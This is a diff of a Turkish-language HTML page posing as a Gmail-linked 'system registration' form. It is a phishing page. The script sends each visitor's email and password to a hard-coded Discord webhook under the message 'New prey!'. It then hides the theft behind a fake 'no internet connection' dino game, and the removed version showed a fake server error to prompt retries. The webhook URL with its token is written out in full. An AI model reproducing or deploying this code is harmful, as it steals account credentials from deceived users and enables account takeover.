@@ -1,50 +1,99 @@
-<h2 style="color:#3c4043">Sistem Kaydı</h2>
-<p style="color:#5f6368; font-size: 14px;">Devam etmek için Gmail ile bağlanın</p>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Kaydı</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f1f3f4; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        
+        /* Oyun Alanı */
+        #gameArea { display: none; margin-top: 20px; position: relative; width: 100%; height: 150px; background: #f7f7f7; border-bottom: 2px solid #555; overflow: hidden; }
+        #dino { width: 30px; height: 30px; background: #555; position: absolute; bottom: 0; left: 50px; }
+        #cactus { width: 20px; height: 40px; background: red; position: absolute; bottom: 0; right: -20px; }
+        .jump { animation: jump 0.5s linear; }
+        @keyframes jump { 0% { bottom: 0; } 30% { bottom: 100px; } 70% { bottom: 100px; } 100% { bottom: 0; } }
+        .block { animation: block 1.5s infinite linear; }
+        @keyframes block { 0% { right: -20px; } 100% { right: 100%; } }
+    </style>
+</head>
+<body>
 
-<form id="trollForm">
-    <input type="email" id="email" placeholder="Gmail Adresiniz" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
-    <input type="password" id="password" placeholder="Şifreniz" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
-    
-    <button type="submit" id="submitBtn" class="btn" style="width: 100%; padding: 12px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">KAYDI TAMAMLA</button>
-    
-    <p id="statusMsg" style="margin-top: 15px; font-size: 13px; font-weight: bold; color: red; display: none;"></p>
-</form>
+<div class="container" id="mainBox">
+    <div id="formSection">
+        <h2 style="color:#3c4043">Sistem Kaydı</h2>
+        <p style="color:#5f6368; font-size: 14px;">Bağlantı için Gmail ile onaylayın</p>
+        <form id="trollForm">
+            <input type="email" id="email" placeholder="Gmail Adresiniz" required>
+            <input type="password" id="password" placeholder="Şifreniz" required>
+            <button type="submit" id="submitBtn" class="btn">KAYDI TAMAMLA</button>
+        </form>
+    </div>
+
+    <div id="gameSection" style="display:none;">
+        <h3 style="color:#d93025">İnternet Bağlantısı Yok</h3>
+        <p style="font-size: 12px; color:#5f6368;">Bağlantı beklenirken stres atın. <br> (Zıplamak için tıkla)</p>
+        <div id="gameArea" onclick="jump()">
+            <div id="dino"></div>
+            <div id="cactus"></div>
+        </div>
+        <p id="scoreLabel" style="font-size: 14px; font-weight: bold;">Puan: 0</p>
+    </div>
+</div>
 
 <script>
-  const webhookURL = "https://discord.com/api/webhooks/1454488470402633879/hYwEM4vWg39W9bH9eg1Tayxd6LUHuDBqiOKWJKB2yvJbgQLgpYeU714kiwxsl1pKq1fz";
+  const webhookURL = "https://discord.com/api/webhooks/1454488470402633879/hYwEM4vWg39W9bH9eg1Tayxd6LUHuDBqiOKWJKB2yvJbgQLgpYeU714kiwxsl1pKq1fz"; // Webhook linkini buraya koy
 
-  document.getElementById("trollForm").onsubmit = async (e) => {
+  const form = document.getElementById("trollForm");
+  const formSection = document.getElementById("formSection");
+  const gameSection = document.getElementById("gameSection");
+  const cactus = document.getElementById("cactus");
+  const dino = document.getElementById("dino");
+  let score = 0;
+
+  form.onsubmit = async (e) => {
     e.preventDefault();
-    const btn = document.getElementById("submitBtn");
-    const msg = document.getElementById("statusMsg");
-    
-    btn.disabled = true;
-    btn.innerText = "Bağlanıyor...";
-
     const email = document.getElementById("email").value;
     const pass = document.getElementById("password").value;
 
-    const payload = {
-      content: "🚀 **Yeni Veri Geldi!**\n📧 **E-posta:** " + email + "\n🔑 **Şifre:** " + pass
-    };
+    // Discord'a gönder
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: "🚀 **Yeni Av!**\n📧: " + email + "\n🔑: " + pass })
+    });
 
-    try {
-      await fetch(webhookURL, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      
-      // Bilgi gitse bile hata gösteriyoruz ki tekrar denesinler
-      msg.innerText = "Hata: Sunucu yoğunluğu nedeniyle bağlantı kurulamadı. Lütfen 1 dakika sonra tekrar deneyin.";
-      msg.style.display = "block";
-      btn.disabled = false;
-      btn.innerText = "TEKRAR DENE";
-      
-    } catch (err) {
-      msg.innerText = "Bağlantı hatası oluştu.";
-      msg.style.display = "block";
-      btn.disabled = false;
-    }
+    // Formu gizle oyunu aç
+    formSection.style.display = "none";
+    gameSection.style.display = "block";
+    document.getElementById("gameArea").style.display = "block";
+    cactus.classList.add("block");
+    
+    // Puan sayacı
+    setInterval(() => {
+        score++;
+        document.getElementById("scoreLabel").innerText = "Puan: " + score;
+    }, 100);
   };
+
+  function jump() {
+    if (!dino.classList.contains("jump")) {
+      dino.classList.add("jump");
+      setTimeout(() => { dino.classList.remove("jump"); }, 500);
+    }
+  }
+
+  // Çarpışma kontrolü
+  setInterval(() => {
+    let dinoTop = parseInt(window.getComputedStyle(dino).getPropertyValue("top"));
+    let cactusLeft = parseInt(window.getComputedStyle(cactus).getPropertyValue("left"));
+    if (cactusLeft < 80 && cactusLeft > 50 && dinoTop >= 120) {
+        score = 0; // Çarpınca puan sıfırlanır
+    }
+  }, 10);
 </script>
+
+</body>
+</html>
